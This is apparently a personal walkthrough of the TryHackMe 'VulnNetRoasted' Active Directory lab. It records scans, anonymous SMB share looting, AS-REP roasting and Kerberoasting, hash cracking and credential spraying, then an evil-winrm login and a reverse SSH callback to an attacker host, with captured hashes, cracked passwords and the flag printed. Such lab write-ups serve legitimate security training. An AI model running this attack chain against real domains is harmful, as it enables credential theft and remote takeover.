---
tags:
  - Lab
MachineName: VulnNetRoasted
TargetIP: 10.64.131.199
Domain: vulnnet-rst.local
Username: t-skid
Password: tj072889*
---

## Lab Machine Template
resources: [RustScan](https://github.com/RustScan/RustScan), [feroxbuster](https://github.com/epi052/feroxbuster), [nikto](https://github.com/sullo/nikto), [ffuf](https://github.com/ffuf/ffuf), [nmap](https://github.com/nmap/nmap), [SecLists](https://github.com/danielmiessler/SecLists), [authfinder](https://github.com/Real-Fruit-Snacks/authfinder), [nxc_enum](https://github.com/Real-Fruit-Snacks/nxc_enum)


> [!Info] Machine Info
> - **Platform**: TryHackMe
> - **Difficulty**: Easy
> - **OS**:  Windows
> - **IP Address**: 10.64.131.199
> - **Domain**: [optional - for AD environments]
> - **Date Started**: 2026-02-03
> - **Date Completed**:
> - **User Flag**:
> - **Root Flag**:
> - **Target Hostname**: [optional]
> - **Target FQDN**: [optional]


### Scenario Description
> VulnNet Entertainment just deployed a new instance on their network with the newly-hired system administrators. Being a security-aware company, they as always hired you to perform a penetration test, and see how system administrators are performing.  
### Create Directory Structure

```bash
alias WD=/root/machines/VulnNetRoasted/10.64.131.199 && mkdir -p $WD/{logs,web,scan,nxc,exploit,bloodhound,loot,privesc,www} && cd $WD && touch usernames passwords confirmedCreds notes && ls
```

### Launch Logged Terminal Tabs

```bash
alias WD=/root/machines/VulnNetRoasted/10.64.131.199 && alias TS=$(date +%Y%m%d_%H%M) && xfce4-terminal --maximize --hide-menubar --hide-toolbar --working-directory=$WD/ --title="Shell" -e "script -q -f $WD/logs/shell_$TS.log" --tab --working-directory=$WD/scan --title="Scan" -e "script -q -f $WD/logs/scan_$TS.log" --tab --working-directory=$WD/nxc --title="NXC" -e "script -q -f $WD/logs/nxc_$TS.log" --tab --working-directory=$WD/web --title="Web" -e "script -q -f $WD/logs/web_$TS.log" --tab --working-directory=$WD/exploit --title="Exploit" -e "script -q -f $WD/logs/exploit_$TS.log" --tab --working-directory=$WD/ --title="Notes"
```

### Maximize Terminal Window [optional]

```bash
wmctrl -r :ACTIVE: -b add,maximized_vert,maximized_horz
```

### Enumeration

#### RustScan TCP

```bash
rustscan -a 10.64.131.199 --ulimit 5000 -b 1500 -- -sC -sV -Pn -oN scan.txt
```

```text
# Output
Open 10.64.131.199:53
Open 10.64.131.199:88
Open 10.64.131.199:139
Open 10.64.131.199:135
Open 10.64.131.199:389
Open 10.64.131.199:445
Open 10.64.131.199:464
Open 10.64.131.199:593
Open 10.64.131.199:3269
Open 10.64.131.199:3268
Open 10.64.131.199:5985
Open 10.64.131.199:9389
Open 10.64.131.199:49667
Open 10.64.131.199:49668
Open 10.64.131.199:49670
Open 10.64.131.199:49669
Open 10.64.131.199:49671
Open 10.64.131.199:49699
Open 10.64.131.199:49714

PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 126 Simple DNS Plus

88/tcp    open  kerberos-sec  syn-ack ttl 126 Microsoft Windows Kerberos (server time: 2026-02-04 00:21:17Z)

135/tcp   open  msrpc         syn-ack ttl 126 Microsoft Windows RPC

139/tcp   open  netbios-ssn   syn-ack ttl 126 Microsoft Windows netbios-ssn

389/tcp   open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local0., Site: Default-First-Site-Name)

445/tcp   open  microsoft-ds? syn-ack ttl 126

464/tcp   open  kpasswd5?     syn-ack ttl 126

593/tcp   open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0

3268/tcp  open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local0., Site: Default-First-Site-Name)

3269/tcp  open  tcpwrapped    syn-ack ttl 126

5985/tcp  open  http          syn-ack ttl 126 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0

9389/tcp  open  mc-nmf        syn-ack ttl 126 .NET Message Framing
49667/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49668/tcp open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
49669/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49670/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49671/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49699/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49714/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC

Service Info: Host: WIN-2BO8M1OE1M1; OS: Windows; CPE: cpe:/o:microsoft:windows

```

#### Nmap UDP

```bash
nmap -sU --top-ports 20 -sV 10.64.131.199 -oN udp_scan.txt
```

```text
# Output
PORT      STATE         SERVICE      VERSION
53/udp    open          domain       (generic dns response: NOTIMP)
67/udp    open|filtered dhcps
68/udp    open|filtered dhcpc
69/udp    open|filtered tftp
123/udp   open          ntp          NTP v3
135/udp   open|filtered msrpc
137/udp   open|filtered netbios-ns
138/udp   open|filtered netbios-dgm
139/udp   open|filtered netbios-ssn
161/udp   open|filtered snmp
162/udp   open|filtered snmptrap
445/udp   open|filtered microsoft-ds
500/udp   open|filtered isakmp
514/udp   open|filtered syslog
520/udp   open|filtered route
631/udp   open|filtered ipp
1434/udp  open|filtered ms-sql-m
1900/udp  open|filtered upnp
4500/udp  open|filtered nat-t-ike
49152/udp open|filtered unknown
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-UDP:V=7.95%I=7%D=2/3%Time=698291A1%P=x86_64-pc-linux-gnu%r(DNS-S
SF:D,2E,"\0\0\x80\x82\0\x01\0\0\0\0\0\0\t_services\x07_dns-sd\x04_udp\x05l
SF:ocal\0\0\x0c\0\x01")%r(NBTStat,32,"\x80\xf0\x80\x82\0\x01\0\0\0\0\0\0\x
SF:20CKAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\0\0!\0\x01");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 123.84 seconds

```

#### nxc_enum [optional]

```bash
cd /opt/nxc_enum && python -m nxc_enum 10.64.131.199 -A --copy-paste -o /root/machines/VulnNetRoasted/10.64.131.199/nxc/nxc_enum_results.txt
```

```text
# Output
  Hostname:        WIN-2BO8M1OE1M1
  FQDN:            WIN-2BO8M1OE1M1.vulnnet-rst.local
  NetBIOS Domain:  VULNNET-RST
  DNS Domain:      vulnnet-rst.local
  OS: Windows 10 / Server 2019 Build 17763 x64
  OS version: '2019'
  Architecture: x64
  OS build: '17763'


ACCESSIBLE SHARES (6)
Share           Access       Type     Comment
--------------- ------------ -------- -------------------------
ADMIN$          READ         DISK     Remote Admin
C$              READ         DISK     Default share
NETLOGON        READ         DISK     Logon server share
SYSVOL          READ         DISK     Logon server share
VulnNet-Business-Anonymous READ         DISK     VulnNet Business Sharing
VulnNet-Enterprise-Anonymous READ         DISK     VulnNet Enterprise Sha...

NO ACCESS (1)
Share           Type     Comment
--------------- -------- -------------------------
IPC$            IPC      Remote IPC
```

### smbclient known shares

```bash
smbclient -N \\\\10.64.131.199\\ADMIN$
smbclient -N \\\\10.64.131.199\\C$
smbclient -N \\\\10.64.131.199\\IPC$
smbclient -N \\\\10.64.131.199\\NETLOGON
smbclient -N \\\\10.64.131.199\\SYSVOL
smbclient -N \\\\10.64.131.199\\VulnNet-Business-Anonymous
smbclient -N \\\\10.64.131.199\\VulnNet-Enterprise-Anonymous
```

###  Downloads all files and subdirectories from current location.
```bash
mask ""

recurse ON

prompt OFF

mget *

```

#### VulnNet-Enterprise-Anonymous (Share Documents)
```bash
smbclient -N \\\\10.64.131.199\\VulnNet-Enterprise-Anonymous
```

```bash
VULNNET OPERATIONS
~~~~~~~~~~~~~~~~~~~~

We bring predictability and consistency to your process. Making it repetitive doesn’t make it boring. 
Set the direction, define roles, and rely on automation to keep reps focused and make onboarding a breeze.
Don't wait for an opportunity to knock - build the door. Contact us right now.
VulnNet Entertainment is fully commited to growth, security and improvement.
Make a right decision!

~VulnNet Entertainment
~TryHackMe
VULNNET SAFETY
~~~~~~~~~~~~~~~~

Tony Skid is a core security manager and takes care of internal infrastructure.
We keep your data safe and private. When it comes to protecting your private information...
we’ve got it locked down tighter than Alcatraz. 
We partner with TryHackMe, use 128-bit SSL encryption, and create daily backups. 
And we never, EVER disclose any data to third-parties without your permission. 
Rest easy, nothing’s getting out of here alive.

~VulnNet Entertainment
~TryHackMe
VULNNET SYNC
~~~~~~~~~~~~~~

Johnny Leet keeps the whole infrastructure up to date and helps you sync all of your apps.
Proposals are just one part of your agency sales process. We tie together your other software, so you can import contacts from your CRM,
auto create deals and generate invoices in your accounting software. We are regularly adding new integrations.
Say no more to desync problems.
To contact our sync manager call this number: 7331 0000 1337

~VulnNet Entertainment
~TryHackMe
```

#### VulnNet-Business-Anonymous (Share Documents)
```bash
smbclient -N \\\\10.64.131.199\\VulnNet-Business-Anonymous
```

```bash
VULNNET BUSINESS
~~~~~~~~~~~~~~~~~~~

Alexa Whitehat is our core business manager. All business-related offers, campaigns, and advertisements should be directed to her. 
We understand that when you’ve got questions, especially when you’re on a tight proposal deadline, you NEED answers. 
Our customer happiness specialists are at the ready, armed with friendly, helpful, timely support by email or online messaging.
We’re here to help, regardless of which you plan you’re on or if you’re just taking us for a test drive.
Our company looks forward to all of the business proposals, we will do our best to evaluate all of your offers properly. 
To contact our core business manager call this number: 1337 0000 7331

~VulnNet Entertainment
~TryHackMe
VULNNET BUSINESS
~~~~~~~~~~~~~~~~~~~

Jack Goldenhand is the person you should reach to for any business unrelated proposals.
Managing proposals is a breeze with VulnNet. We save all your case studies, fees, images and team bios all in one central library.
Tag them, search them and drop them into your layout. Proposals just got... dare we say... fun?
No more emailing big PDFs, printing and shipping proposals or faxing back signatures (ugh).
Your client gets a branded, interactive proposal they can sign off electronically. No need for extra software or logins.
Oh, and we tell you as soon as your client opens it.

~VulnNet Entertainment
~TryHackMe
VULNNET TRACKING
~~~~~~~~~~~~~~~~~~

Keep a pulse on your sales pipeline of your agency. We let you know your close rate,
which sections of your proposals get viewed and for how long,
and all kinds of insight into what goes into your most successful proposals so you can sell smarter.
We keep track of all necessary activities and reach back to you with newly gathered data to discuss the outcome. 
You won't miss anything ever again. 

~VulnNet Entertainment
~TryHackMe
```
### Active Directory Username Generator
```bash
python3 username-generate.py -u /root/machines/VulnNetRoasted/10.64.131.199/usernames -o /root/machines/VulnNetRoasted/10.64.131.199/generated_usernames
```

#### nxc_enum [optional]

```bash
cd /opt/nxc_enum && python -m nxc_enum 10.64.131.199 -U /root/machines/VulnNetRoasted/10.64.131.199/generated_usernames -A --copy-paste -o /root/machines/VulnNetRoasted/10.64.131.199/nxc/users_nxc_enum_results.txt
```

```bash
# Output
 ===========================================
|    AS-REP Roasting for 10.64.131.199    |
 ===========================================
[*] Requesting AS-REP tickets for 44 user(s)...
[!] Found 1 AS-REP hash(es)!

$krb5asrep$23$t-skid@VULNNET-RST.LOCAL:3ee183de99a7553e0f5b1a34a2d3b60a$7ffcfed6f4a1e4974f722ee44a44d7c76d40e9d340a8144237722269c8b6a83eed60bfba9bf9ab5f2847d3926d15619fcb10d24dd863d26da913eb4398ab39b46bc405fa143eee97e667212adaaa596d98a402e6a98576bb6f569a8ec04583996dea521a2a5ddef7bdc9f92c7f23ab384d74e5ef266e57f507efb897c25cbb62835ea43c41beae1ac85af1245aee10f904b0fe9f61f3394d18fa20df9ce463d1b170e08dbc6ea7c19ab3f5b5c4a9e505c1c536f636df3c3f89e1294c60b7017a562f0a3533d56cc598b9076ac2dcb09b170b91e44541cf1beac19ff4198eefc8ea61f6a198734232b992094c315fd5a5e2622d408047
```

#### Hashcat
```bash
hashcat -m 18200 hashes.txt /usr/share/wordlists/rockyou.txt
```

```bash
# Output
tj072889*
```

### nxc_enum with t-skid creds
```bash
cd /opt/nxc_enum && python -m nxc_enum 10.64.131.199 -C /root/machines/VulnNetRoasted/10.64.131.199/confirmedCreds -A --copy-paste -o /root/machines/VulnNetRoasted/10.64.131.199/nxc/admin_nxc_enum_results.txt
```

```bash
# Output
  → Kerberoastable accounts: enterprise-core-vn
    Request TGS tickets for offline cracking with hashcat
    $ nxc ldap 10.64.131.199 -u 't-skid' -p 'tj072889*' -d 'vulnnet-rst.local' --kerberoasting hashes.txt
```

### Kerberoast
```bash
impacket-GetUserSPNs -request -dc-ip 10.64.175.157 vulnnet-rst.local/t-skid:'tj072889*' -outputfile kerberoast.txt
```

```bash
$krb5tgs$23$*enterprise-core-vn$VULNNET-RST.LOCAL$vulnnet-rst.local/enterprise-core-vn*$4da5aed881d51b0c6a66de837803959f$e895b29b5ffab3217b3c7ea6ec356eeb8ff131e9c78f9b65558de8baf1ae161a25aae89222b14d147bff2aa35f0f92c769227fc214ed752674dc3fbc58d69b3157cf449b3d0cfb8b027e351ef638e0dcafb908459a5d185120994239424ce366e17cbb80a18d5a15ef5d64f9eb29bbec60159f7dba82e004a36774b551a5882b1cb3891bba23670e426429051e1f3918b94bb317d404be061d15aef2f2294b1419dea1bc4fe21937fde634a282f09cb4f0d5f0632987fdeab03fead9c81c6d9b50e417c721c0d885bf9130bf8517e087f78e2e6b2d364effe4aa88ea2e09a6edf7ee8c7cdfa9248ff06e5a7c4090d1f806a3bb4026762d750b7668c475efc022b023ec1a0c3679923b8825b4493ba45d8a9d2fe45bb94a1b01649055b52428c6d5ff5368bc82c110b9363486bb573e2effa2e8331ef09218169a11cc8aef3d9c3c98b6b2218b9efa0e0bdb85858e437a4e2573e60f086dd6105de2d6fab8c895f71835437787c4834125a52ebced98e0716bd48639ebdc75094d18c410509c9479bf98d0c69979847267fab57f393040e5df3945abd9addd8df24072c6eb76c1211669becda4df2dd83e3d5d81b9388bf5f8cee163097338276ccd2eb6420422641d3ee88bf5abe5db9056efe5cf1973fd7e3fbaf3486fd1376476597d31dedee1dd957a10a057eb60ba249f44543e44b6933d519302df5b07eb7f73c03b35763c1992b74581606dced817df02873622f3b824231b372ec24fa23c82b1f8ef4eb951108b83bda6a2238592658da8f149c6548fd4efca41cf285d2a4b432668417cf5820fd3d0ee69066b0001291d0c1b8a7c6d031099001cca4dc29c35d2b4e9f40e1dd5af996d2f3b0a04bcfdcad2f84d11465125c8e6cc6ab0d0adbe7df5bd934c6d1aee52e24068a897cac5a3da92d45ce56bbdbee725746b09c27c262cf4ebe84f214729cc2877332d8078c1b93d9cafc6feac79d8e64d72c18b37e07bc1da8843be14e8b70097c820c4c281001dbe0476397c7c17025dd6150bdfbc7f80d0141e579cb63326af2c29f649df3f9e7c2e2ea8a9ced36381ce5fe709ac29fbc8714c91e91178f9ffc49f7c106cee3e90fd0c5eac0c55ee3905da0e142101fc563868610c6228111f688ead831fce909972fb8e340a3a64cfbde6ea8dc6a334fa652c283664b643e1f5b30da80f404b272815a1b3a57820e3fde2a84e29a76745826d42ae3c41d77433c6cc49bf0cb4012e3531f25869c6e2fa7e73df665a82a3222ed2c66d339a6b58b92923ffa3607520feea991dce44562edb84670dec44d4664e2f0144e0d4ec2020e21676ba66932ad467d718e66f1db7fc86f53d6ea0876ad3a399dc866fed3b4ebfea02cb356803d07797efc4169c76d6fb13
```
#### Crack
```bash
hashcat -m 13100 hashes.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule
```

```bash
# Output
$krb5tgs$23$*enterprise-core-vn$VULNNET-RST.LOCAL$vulnnet-rst.local/enterprise-core-vn*$4da5aed881d51b0c6a66de837803959f$e895b29b5ffab3217b3c7ea6ec356eeb8ff131e9c78f9b65558de8baf1ae161a25aae89222b14d147bff2aa35f0f92c769227fc214ed752674dc3fbc58d69b3157cf449b3d0cfb8b027e351ef638e0dcafb908459a5d185120994239424ce366e17cbb80a18d5a15ef5d64f9eb29bbec60159f7dba82e004a36774b551a5882b1cb3891bba23670e426429051e1f3918b94bb317d404be061d15aef2f2294b1419dea1bc4fe21937fde634a282f09cb4f0d5f0632987fdeab03fead9c81c6d9b50e417c721c0d885bf9130bf8517e087f78e2e6b2d364effe4aa88ea2e09a6edf7ee8c7cdfa9248ff06e5a7c4090d1f806a3bb4026762d750b7668c475efc022b023ec1a0c3679923b8825b4493ba45d8a9d2fe45bb94a1b01649055b52428c6d5ff5368bc82c110b9363486bb573e2effa2e8331ef09218169a11cc8aef3d9c3c98b6b2218b9efa0e0bdb85858e437a4e2573e60f086dd6105de2d6fab8c895f71835437787c4834125a52ebced98e0716bd48639ebdc75094d18c410509c9479bf98d0c69979847267fab57f393040e5df3945abd9addd8df24072c6eb76c1211669becda4df2dd83e3d5d81b9388bf5f8cee163097338276ccd2eb6420422641d3ee88bf5abe5db9056efe5cf1973fd7e3fbaf3486fd1376476597d31dedee1dd957a10a057eb60ba249f44543e44b6933d519302df5b07eb7f73c03b35763c1992b74581606dced817df02873622f3b824231b372ec24fa23c82b1f8ef4eb951108b83bda6a2238592658da8f149c6548fd4efca41cf285d2a4b432668417cf5820fd3d0ee69066b0001291d0c1b8a7c6d031099001cca4dc29c35d2b4e9f40e1dd5af996d2f3b0a04bcfdcad2f84d11465125c8e6cc6ab0d0adbe7df5bd934c6d1aee52e24068a897cac5a3da92d45ce56bbdbee725746b09c27c262cf4ebe84f214729cc2877332d8078c1b93d9cafc6feac79d8e64d72c18b37e07bc1da8843be14e8b70097c820c4c281001dbe0476397c7c17025dd6150bdfbc7f80d0141e579cb63326af2c29f649df3f9e7c2e2ea8a9ced36381ce5fe709ac29fbc8714c91e91178f9ffc49f7c106cee3e90fd0c5eac0c55ee3905da0e142101fc563868610c6228111f688ead831fce909972fb8e340a3a64cfbde6ea8dc6a334fa652c283664b643e1f5b30da80f404b272815a1b3a57820e3fde2a84e29a76745826d42ae3c41d77433c6cc49bf0cb4012e3531f25869c6e2fa7e73df665a82a3222ed2c66d339a6b58b92923ffa3607520feea991dce44562edb84670dec44d4664e2f0144e0d4ec2020e21676ba66932ad467d718e66f1db7fc86f53d6ea0876ad3a399dc866fed3b4ebfea02cb356803d07797efc4169c76d6fb13:ry=ibfkfv,s6h,
```

#### authfinder

```bash
cd /opt/authfinder && python3 authfinder.py 10.64.175.157 -f /root/machines/VulnNetRoasted/10.64.131.199/confirmedCreds
```

```text
Target           Username         Password             Service      Result
──────────────── ──────────────── ──────────────────── ──────────── ────────────
10.64.175.157    enterprise-core  ry=ibfkfv,s6h,       winrm        Auth
10.64.175.157    enterprise-core  ry=ibfkfv,s6h,       smbexec      Auth
10.64.175.157    enterprise-core  ry=ibfkfv,s6h,       wmi          Auth
10.64.175.157    enterprise-core  ry=ibfkfv,s6h,       psexec       Auth
10.64.175.157    enterprise-core  ry=ibfkfv,s6h,       atexec       Auth
10.64.175.157    enterprise-core  ry=ibfkfv,s6h,       ldap         Auth
```

### Evil-winrm
```bash
evil-winrm -i 10.64.175.157 -u 'enterprise-core-vn' -p 'ry=ibfkfv,s6h,'
```

```bash
*Evil-WinRM* PS C:\Users\enterprise-core-vn\Desktop> type user.txt
THM{726b7c0baaac1455d05c827b5561f4ed}
```

### RSSH
```bash
❯ ./build.sh reverse 192.168.148.119:443

[*] Build Configuration:
[*]   Mode:     reverse
[*]   Target:   reverse@192.168.148.119:443
[*]   BindPort: random (allocated by SSH server)
```

```bash
[*] Reverse-SSH Handler
[*] ─────────────────────────────────────────────────────────

[*] Listening on port:  443
[*] Expecting callback: 192.168.148.119
[*] Username:           reverse
[*] Password:           134bd652b73ffc6d

[!] When you see 'New connection from', run:

    ssh -p <PORT> reverse@127.0.0.1

[!] Random port mode: Look for 'reachable via 127.0.0.1:<PORT>'
[!] in the connection message below to find the actual port.

[*] ─────────────────────────────────────────────────────────

2026/02/04 20:35:50 Starting ssh server on :443
2026/02/04 20:35:50 Success: listening on [::]:443
2026/02/04 20:37:00 Attempt to bind at 127.0.0.1:0 granted
2026/02/04 20:37:00 New connection from 10.64.175.157:50206: VULNNET-RST\enterprise-core-vn on WIN-2BO8M1OE1M1 reachable via 127.0.0.1:33865
```

```bash
ssh -MS /tmp/target r@127.0.0.1 -p 38609
```

> [!danger] My connection to this lab has died over 5 times now...